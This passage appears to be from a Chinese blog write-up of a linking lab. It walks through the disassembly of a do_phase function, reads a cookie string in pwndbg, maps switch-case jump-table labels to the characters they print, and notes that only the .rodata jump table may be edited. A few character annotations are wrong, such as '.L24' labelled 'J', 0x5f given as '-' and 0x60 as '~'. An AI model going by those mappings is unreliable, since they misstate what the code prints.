<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00001225</span> &lt;do_phase&gt;:</span><br><span class="line">    <span class="number">1225</span>:	<span class="number">55</span>                   	push   %ebp</span><br><span class="line">    <span class="number">1226</span>:	<span class="number">89</span> e5                	mov    %esp,%ebp</span><br><span class="line">    <span class="number">1228</span>:	<span class="number">53</span>                   	push   %ebx</span><br><span class="line">    <span class="number">1229</span>:	<span class="number">83</span> ec <span class="number">24</span>             	sub    $<span class="number">0x24</span>,%esp</span><br><span class="line">    <span class="number">122</span>c:	e8 <span class="number">9f</span> fe ff ff       	call   <span class="number">10</span>d0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">    <span class="number">1231</span>:	<span class="number">81</span> c3 <span class="number">9f</span> <span class="number">2</span>d <span class="number">00</span> <span class="number">00</span>    	add    $<span class="number">0x2d9f</span>,%ebx</span><br><span class="line">    <span class="number">1237</span>:	<span class="number">65</span> a1 <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	mov    %gs:<span class="number">0x14</span>,%eax</span><br><span class="line">    <span class="number">123</span>d:	<span class="number">89</span> <span class="number">45</span> f4             	mov    %eax,<span class="number">-0xc</span>(%ebp)</span><br><span class="line">    <span class="number">1240</span>:	<span class="number">31</span> c0                	<span class="keyword">xor</span>    %eax,%eax</span><br><span class="line">    <span class="number">1242</span>:	c7 <span class="number">45</span> e9 <span class="number">42</span> <span class="number">47</span> <span class="number">4f</span> <span class="number">4</span>d 	movl   $<span class="number">0x4d4f4742</span>,<span class="number">-0x17</span>(%ebp) <span class="comment">// target</span></span><br><span class="line">    <span class="number">1249</span>:	c7 <span class="number">45</span> ed <span class="number">45</span> <span class="number">49</span> <span class="number">55</span> <span class="number">46</span> 	movl   $<span class="number">0x46554945</span>,<span class="number">-0x13</span>(%ebp) <span class="comment">// target</span></span><br><span class="line">    <span class="number">1250</span>:	<span class="number">66</span> c7 <span class="number">45</span> f1 <span class="number">51</span> <span class="number">4</span>a    	movw   $<span class="number">0x4a51</span>,<span class="number">-0xf</span>(%ebp) <span class="comment">// target</span></span><br><span class="line">    <span class="number">1256</span>:	c6 <span class="number">45</span> f3 <span class="number">00</span>          	movb   $<span class="number">0x0</span>,<span class="number">-0xd</span>(%ebp)</span><br><span class="line">    <span class="number">125</span>a:	c7 <span class="number">45</span> e4 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	movl   $<span class="number">0x0</span>,<span class="number">-0x1c</span>(%ebp)</span><br><span class="line">    <span class="number">1261</span>:	e9 e7 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	jmp    <span class="number">134</span>d &lt;.L30+<span class="number">0x19</span>&gt;</span><br><span class="line">    <span class="number">1266</span>:	<span class="number">8</span>d <span class="number">55</span> e9             	lea    <span class="number">-0x17</span>(%ebp),%edx</span><br><span class="line">    <span class="number">1269</span>:	<span class="number">8b</span> <span class="number">45</span> e4             	mov    <span class="number">-0x1c</span>(%ebp),%eax</span><br><span class="line">    <span class="number">126</span>c:	<span class="number">01</span> d0                	add    %edx,%eax</span><br><span class="line">    <span class="number">126</span>e:	<span class="number">0f</span> b6 <span class="number">00</span>             	movzbl (%eax),%eax</span><br><span class="line">    <span class="number">1271</span>:	<span class="number">88</span> <span class="number">45</span> e3             	mov    %al,<span class="number">-0x1d</span>(%ebp)</span><br><span class="line">    <span class="number">1274</span>:	<span class="number">0f</span> be <span class="number">45</span> e3          	movsbl <span class="number">-0x1d</span>(%ebp),%eax</span><br><span class="line">    <span class="number">1278</span>:	<span class="number">83</span> e8 <span class="number">41</span>             	sub    $<span class="number">0x41</span>,%eax</span><br><span class="line">    <span class="number">127b</span>:	<span class="number">83</span> f8 <span class="number">19</span>             	cmp    $<span class="number">0x19</span>,%eax</span><br><span class="line">    <span class="number">127</span>e:	<span class="number">0f</span> <span class="number">87</span> b5 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	ja     <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line">    <span class="number">1284</span>:	c1 e0 <span class="number">02</span>             	shl    $<span class="number">0x2</span>,%eax</span><br><span class="line">    <span class="number">1287</span>:	<span class="number">8b</span> <span class="number">84</span> <span class="number">18</span> ac e0 ff ff 	mov    <span class="number">-0x1f54</span>(%eax,%ebx,<span class="number">1</span>),%eax</span><br><span class="line">    <span class="number">128</span>e:	<span class="number">01</span> d8                	add    %ebx,%eax</span><br><span class="line">    <span class="number">1290</span>:	ff e0                	jmp    *%eax</span><br></pre></td></tr></table></figure>
<p>这次直接在GDB中获取 COOKIE 了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/xs <span class="number">0xffffcf00</span>+<span class="number">1</span></span><br><span class="line"><span class="number">0xffffcf01</span>:	<span class="string">&quot;BGOMEIUFQJ&quot;</span></span><br></pre></td></tr></table></figure>
<p>在 Switch-Case 中：“BGOMEIUFQJ” 对应“跳转表”表项的顺序为：2 7 15 13 5 9 21 6 17 10 </p>
<p>先看下汇编：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00001225</span> &lt;do_phase&gt;:</span><br><span class="line">    <span class="number">1225</span>:	<span class="number">55</span>                   	push   %ebp</span><br><span class="line">    <span class="number">1226</span>:	<span class="number">89</span> e5                	mov    %esp,%ebp</span><br><span class="line">    <span class="number">1228</span>:	<span class="number">53</span>                   	push   %ebx</span><br><span class="line">    <span class="number">1229</span>:	<span class="number">83</span> ec <span class="number">24</span>             	sub    $<span class="number">0x24</span>,%esp</span><br><span class="line">    <span class="number">122</span>c:	e8 <span class="number">9f</span> fe ff ff       	call   <span class="number">10</span>d0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">    <span class="number">1231</span>:	<span class="number">81</span> c3 <span class="number">9f</span> <span class="number">2</span>d <span class="number">00</span> <span class="number">00</span>    	add    $<span class="number">0x2d9f</span>,%ebx</span><br><span class="line">    <span class="number">1237</span>:	<span class="number">65</span> a1 <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	mov    %gs:<span class="number">0x14</span>,%eax</span><br><span class="line">    <span class="number">123</span>d:	<span class="number">89</span> <span class="number">45</span> f4             	mov    %eax,<span class="number">-0xc</span>(%ebp)</span><br><span class="line">    <span class="number">1240</span>:	<span class="number">31</span> c0                	<span class="keyword">xor</span>    %eax,%eax</span><br><span class="line">    <span class="number">1242</span>:	c7 <span class="number">45</span> e9 <span class="number">42</span> <span class="number">47</span> <span class="number">4f</span> <span class="number">4</span>d 	movl   $<span class="number">0x4d4f4742</span>,<span class="number">-0x17</span>(%ebp)</span><br><span class="line">    <span class="number">1249</span>:	c7 <span class="number">45</span> ed <span class="number">45</span> <span class="number">49</span> <span class="number">55</span> <span class="number">46</span> 	movl   $<span class="number">0x46554945</span>,<span class="number">-0x13</span>(%ebp)</span><br><span class="line">    <span class="number">1250</span>:	<span class="number">66</span> c7 <span class="number">45</span> f1 <span class="number">51</span> <span class="number">4</span>a    	movw   $<span class="number">0x4a51</span>,<span class="number">-0xf</span>(%ebp)</span><br><span class="line">    <span class="number">1256</span>:	c6 <span class="number">45</span> f3 <span class="number">00</span>          	movb   $<span class="number">0x0</span>,<span class="number">-0xd</span>(%ebp)</span><br><span class="line">    <span class="number">125</span>a:	c7 <span class="number">45</span> e4 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	movl   $<span class="number">0x0</span>,<span class="number">-0x1c</span>(%ebp)</span><br><span class="line">    <span class="number">1261</span>:	e9 e7 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	jmp    <span class="number">134</span>d &lt;.L30+<span class="number">0x19</span>&gt;</span><br><span class="line">    <span class="number">1266</span>:	<span class="number">8</span>d <span class="number">55</span> e9             	lea    <span class="number">-0x17</span>(%ebp),%edx</span><br><span class="line">    <span class="number">1269</span>:	<span class="number">8b</span> <span class="number">45</span> e4             	mov    <span class="number">-0x1c</span>(%ebp),%eax</span><br><span class="line">    <span class="number">126</span>c:	<span class="number">01</span> d0                	add    %edx,%eax</span><br><span class="line">    <span class="number">126</span>e:	<span class="number">0f</span> b6 <span class="number">00</span>             	movzbl (%eax),%eax</span><br><span class="line">    <span class="number">1271</span>:	<span class="number">88</span> <span class="number">45</span> e3             	mov    %al,<span class="number">-0x1d</span>(%ebp)</span><br><span class="line">    <span class="number">1274</span>:	<span class="number">0f</span> be <span class="number">45</span> e3          	movsbl <span class="number">-0x1d</span>(%ebp),%eax</span><br><span class="line">    <span class="number">1278</span>:	<span class="number">83</span> e8 <span class="number">41</span>             	sub    $<span class="number">0x41</span>,%eax</span><br><span class="line">    <span class="number">127b</span>:	<span class="number">83</span> f8 <span class="number">19</span>             	cmp    $<span class="number">0x19</span>,%eax</span><br><span class="line">    <span class="number">127</span>e:	<span class="number">0f</span> <span class="number">87</span> b5 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	ja     <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line">    <span class="number">1284</span>:	c1 e0 <span class="number">02</span>             	shl    $<span class="number">0x2</span>,%eax</span><br><span class="line">    <span class="number">1287</span>:	<span class="number">8b</span> <span class="number">84</span> <span class="number">18</span> ac e0 ff ff 	mov    <span class="number">-0x1f54</span>(%eax,%ebx,<span class="number">1</span>),%eax</span><br><span class="line">    <span class="number">128</span>e:	<span class="number">01</span> d8                	add    %ebx,%eax</span><br><span class="line">    <span class="number">1290</span>:	ff e0                	jmp    *%eax</span><br><span class="line"></span><br><span class="line"><span class="number">00001292</span> &lt;.L4&gt;: </span><br><span class="line">    <span class="number">1292</span>:	c6 <span class="number">45</span> e3 <span class="number">54</span>          	movb   $<span class="number">0x54</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// A &gt;&gt; T</span></span><br><span class="line">    <span class="number">1296</span>:	e9 <span class="number">9</span>e <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">0000129b</span> &lt;.L6&gt;:</span><br><span class="line">    <span class="number">129b</span>:	c6 <span class="number">45</span> e3 <span class="number">77</span>          	movb   $<span class="number">0x77</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// B &gt;&gt; w</span></span><br><span class="line">    <span class="number">129f</span>:	e9 <span class="number">95</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">000012</span>a4 &lt;.L7&gt;:</span><br><span class="line">    <span class="number">12</span>a4:	c6 <span class="number">45</span> e3 <span class="number">70</span>          	movb   $<span class="number">0x70</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// C &gt;&gt; p</span></span><br><span class="line">    <span class="number">12</span>a8:	e9 <span class="number">8</span>c <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">000012</span>ad &lt;.L8&gt;:</span><br><span class="line">    <span class="number">12</span>ad:	c6 <span class="number">45</span> e3 <span class="number">36</span>          	movb   $<span class="number">0x36</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// D &gt;&gt; 6</span></span><br><span class="line">    <span class="number">12b</span>1:	e9 <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">000012b</span>6 &lt;.L9&gt;:</span><br><span class="line">    <span class="number">12b</span>6:	c6 <span class="number">45</span> e3 <span class="number">54</span>          	movb   $<span class="number">0x54</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// E &gt;&gt; T</span></span><br><span class="line">    <span class="number">12b</span>a:	eb <span class="number">7</span>d                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">000012b</span>c &lt;.L10&gt;:</span><br><span class="line">    <span class="number">12b</span>c:	c6 <span class="number">45</span> e3 <span class="number">33</span>          	movb   $<span class="number">0x33</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// F &gt;&gt; 3</span></span><br><span class="line">    <span class="number">12</span>c0:	eb <span class="number">77</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">000012</span>c2 &lt;.L11&gt;:</span><br><span class="line">    <span class="number">12</span>c2:	c6 <span class="number">45</span> e3 <span class="number">6</span>c          	movb   $<span class="number">0x6c</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// G &gt;&gt; l</span></span><br><span class="line">    <span class="number">12</span>c6:	eb <span class="number">71</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">000012</span>c8 &lt;.L12&gt;:</span><br><span class="line">    <span class="number">12</span>c8:	c6 <span class="number">45</span> e3 <span class="number">34</span>          	movb   $<span class="number">0x34</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// H &gt;&gt; 4</span></span><br><span class="line">    <span class="number">12</span>cc:	eb <span class="number">6b</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">000012</span>ce &lt;.L13&gt;:</span><br><span class="line">    <span class="number">12</span>ce:	c6 <span class="number">45</span> e3 <span class="number">5</span>a          	movb   $<span class="number">0x5a</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// I &gt;&gt; Z </span></span><br><span class="line">    <span class="number">12</span>d2:	eb <span class="number">65</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">000012</span>d4 &lt;.L14&gt;:</span><br><span class="line">    <span class="number">12</span>d4:	c6 <span class="number">45</span> e3 <span class="number">4</span>a          	movb   $<span class="number">0x4a</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// J &gt;&gt; J </span></span><br><span class="line">    <span class="number">12</span>d8:	eb <span class="number">5f</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">000012</span>da &lt;.L15&gt;:</span><br><span class="line">    <span class="number">12</span>da:	c6 <span class="number">45</span> e3 <span class="number">51</span>          	movb   $<span class="number">0x51</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// K &gt;&gt; Q</span></span><br><span class="line">    <span class="number">12</span>de:	eb <span class="number">59</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">000012e0</span> &lt;.L16&gt;:</span><br><span class="line">    <span class="number">12e0</span>:	c6 <span class="number">45</span> e3 <span class="number">4</span>d          	movb   $<span class="number">0x4d</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// L &gt;&gt; M</span></span><br><span class="line">    <span class="number">12e4</span>:	eb <span class="number">53</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">000012e6</span> &lt;.L17&gt;:</span><br><span class="line">    <span class="number">12e6</span>:	c6 <span class="number">45</span> e3 <span class="number">5f</span>          	movb   $<span class="number">0x5f</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// M &gt;&gt; -</span></span><br><span class="line">    <span class="number">12</span>ea:	eb <span class="number">4</span>d                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">000012</span>ec &lt;.L18&gt;:</span><br><span class="line">    <span class="number">12</span>ec:	c6 <span class="number">45</span> e3 <span class="number">38</span>          	movb   $<span class="number">0x38</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// N &gt;&gt; 8</span></span><br><span class="line">    <span class="number">12f</span>0:	eb <span class="number">47</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">000012f</span>2 &lt;.L19&gt;:</span><br><span class="line">    <span class="number">12f</span>2:	c6 <span class="number">45</span> e3 <span class="number">30</span>          	movb   $<span class="number">0x30</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// O &gt;&gt; 0</span></span><br><span class="line">    <span class="number">12f</span>6:	eb <span class="number">41</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">000012f</span>8 &lt;.L20&gt;:</span><br><span class="line">    <span class="number">12f</span>8:	c6 <span class="number">45</span> e3 <span class="number">32</span>          	movb   $<span class="number">0x32</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// P &gt;&gt; 2</span></span><br><span class="line">    <span class="number">12f</span>c:	eb <span class="number">3b</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">000012f</span>e &lt;.L21&gt;:</span><br><span class="line">    <span class="number">12f</span>e:	c6 <span class="number">45</span> e3 <span class="number">76</span>          	movb   $<span class="number">0x76</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// Q &gt;&gt; v</span></span><br><span class="line">    <span class="number">1302</span>:	eb <span class="number">35</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">00001304</span> &lt;.L22&gt;:</span><br><span class="line">    <span class="number">1304</span>:	c6 <span class="number">45</span> e3 <span class="number">35</span>          	movb   $<span class="number">0x35</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// R &gt;&gt; 5</span></span><br><span class="line">    <span class="number">1308</span>:	eb <span class="number">2f</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">0000130</span>a &lt;.L23&gt;:</span><br><span class="line">    <span class="number">130</span>a:	c6 <span class="number">45</span> e3 <span class="number">3</span>c          	movb   $<span class="number">0x3c</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// S &gt;&gt; &lt;</span></span><br><span class="line">    <span class="number">130</span>e:	eb <span class="number">29</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">00001310</span> &lt;.L24&gt;:</span><br><span class="line">    <span class="number">1310</span>:	c6 <span class="number">45</span> e3 <span class="number">39</span>          	movb   $<span class="number">0x39</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// J &gt;&gt; 9</span></span><br><span class="line">    <span class="number">1314</span>:	eb <span class="number">23</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">00001316</span> &lt;.L25&gt;:</span><br><span class="line">    <span class="number">1316</span>:	c6 <span class="number">45</span> e3 <span class="number">62</span>          	movb   $<span class="number">0x62</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// U &gt;&gt; b</span></span><br><span class="line">    <span class="number">131</span>a:	eb <span class="number">1</span>d                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">0000131</span>c &lt;.L26&gt;:</span><br><span class="line">    <span class="number">131</span>c:	c6 <span class="number">45</span> e3 <span class="number">57</span>          	movb   $<span class="number">0x57</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// V &gt;&gt; W</span></span><br><span class="line">    <span class="number">1320</span>:	eb <span class="number">17</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">00001322</span> &lt;.L27&gt;:</span><br><span class="line">    <span class="number">1322</span>:	c6 <span class="number">45</span> e3 <span class="number">60</span>          	movb   $<span class="number">0x60</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// W &gt;&gt; ~</span></span><br><span class="line">    <span class="number">1326</span>:	eb <span class="number">11</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">00001328</span> &lt;.L28&gt;:</span><br><span class="line">    <span class="number">1328</span>:	c6 <span class="number">45</span> e3 <span class="number">4</span>d          	movb   $<span class="number">0x4d</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// X &gt;&gt; M</span></span><br><span class="line">    <span class="number">132</span>c:	eb <span class="number">0b</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">0000132</span>e &lt;.L29&gt;:</span><br><span class="line">    <span class="number">132</span>e:	c6 <span class="number">45</span> e3 <span class="number">31</span>          	movb   $<span class="number">0x31</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// Y &gt;&gt; 1</span></span><br><span class="line">    <span class="number">1332</span>:	eb <span class="number">05</span>                	jmp    <span class="number">1339</span> &lt;.L30+<span class="number">0x5</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">00001334</span> &lt;.L30&gt;:</span><br><span class="line">    <span class="number">1334</span>:	c6 <span class="number">45</span> e3 <span class="number">37</span>          	movb   $<span class="number">0x37</span>,<span class="number">-0x1d</span>(%ebp) <span class="comment">// Z &gt;&gt; 7</span></span><br><span class="line">    <span class="number">1338</span>:	<span class="number">90</span>                   	nop</span><br><span class="line">    <span class="number">1339</span>:	<span class="number">0f</span> be <span class="number">45</span> e3          	movsbl <span class="number">-0x1d</span>(%ebp),%eax</span><br><span class="line">    <span class="number">133</span>d:	<span class="number">83</span> ec <span class="number">0</span>c             	sub    $<span class="number">0xc</span>,%esp</span><br><span class="line">    <span class="number">1340</span>:	<span class="number">50</span>                   	push   %eax</span><br><span class="line">    <span class="number">1341</span>:	e8 <span class="number">2</span>a fd ff ff       	call   <span class="number">1070</span> &lt;<span class="built_in">putchar</span>@plt&gt;</span><br><span class="line">    <span class="number">1346</span>:	<span class="number">83</span> c4 <span class="number">10</span>             	add    $<span class="number">0x10</span>,%esp</span><br><span class="line">    <span class="number">1349</span>:	<span class="number">83</span> <span class="number">45</span> e4 <span class="number">01</span>          	addl   $<span class="number">0x1</span>,<span class="number">-0x1c</span>(%ebp)</span><br><span class="line">    <span class="number">134</span>d:	<span class="number">8b</span> <span class="number">45</span> e4             	mov    <span class="number">-0x1c</span>(%ebp),%eax</span><br><span class="line">    <span class="number">1350</span>:	<span class="number">83</span> f8 <span class="number">09</span>             	cmp    $<span class="number">0x9</span>,%eax</span><br><span class="line">    <span class="number">1353</span>:	<span class="number">0f</span> <span class="number">86</span> <span class="number">0</span>d ff ff ff    	jbe    <span class="number">1266</span> &lt;do_phase+<span class="number">0x41</span>&gt;</span><br><span class="line">    <span class="number">1359</span>:	<span class="number">83</span> ec <span class="number">0</span>c             	sub    $<span class="number">0xc</span>,%esp</span><br><span class="line">    <span class="number">135</span>c:	<span class="number">6</span>a <span class="number">0</span>a                	push   $<span class="number">0xa</span></span><br><span class="line">    <span class="number">135</span>e:	e8 <span class="number">0</span>d fd ff ff       	call   <span class="number">1070</span> &lt;<span class="built_in">putchar</span>@plt&gt;</span><br><span class="line">    <span class="number">1363</span>:	<span class="number">83</span> c4 <span class="number">10</span>             	add    $<span class="number">0x10</span>,%esp</span><br><span class="line">    <span class="number">1366</span>:	<span class="number">90</span>                   	nop</span><br><span class="line">    <span class="number">1367</span>:	<span class="number">8b</span> <span class="number">45</span> f4             	mov    <span class="number">-0xc</span>(%ebp),%eax</span><br><span class="line">    <span class="number">136</span>a:	<span class="number">65</span> <span class="number">33</span> <span class="number">05</span> <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	<span class="keyword">xor</span>    %gs:<span class="number">0x14</span>,%eax</span><br><span class="line">    <span class="number">1371</span>:	<span class="number">74</span> <span class="number">05</span>                	je     <span class="number">1378</span> &lt;.L30+<span class="number">0x44</span>&gt;</span><br><span class="line">    <span class="number">1373</span>:	e8 <span class="number">88</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	call   <span class="number">1400</span> &lt;__stack_chk_fail_local&gt;</span><br><span class="line">    <span class="number">1378</span>:	<span class="number">8b</span> <span class="number">5</span>d fc             	mov    <span class="number">-0x4</span>(%ebp),%ebx</span><br><span class="line">    <span class="number">137b</span>:	c9                   	leave  </span><br><span class="line">    <span class="number">137</span>c:	c3                   	ret    </span><br><span class="line">    <span class="number">137</span>d:	<span class="number">66</span> <span class="number">90</span>                	xchg   %ax,%ax</span><br><span class="line">    <span class="number">137f</span>:	<span class="number">90</span>                   	nop</span><br></pre></td></tr></table></figure>
<p>这些奇怪的 L4 L6 L7 就是字符了（主要是因为它们有26个）</p>
<p>“jmp    1339 &lt;.L30+0x5&gt;”应该就是“break”，可以通过 movb 来获取对应的打印数据（已标记）</p>
<p>实验四想要我们修改“phase4.o”，但不让我们修改 .text 节的内容（可执行指令的集合），所以我们只能改 .rodata 节中的“跳转表”</p>
<p>​        // 可采用以下代码证明：L4 L6 L7 就是 A，B，C，D …… </p>
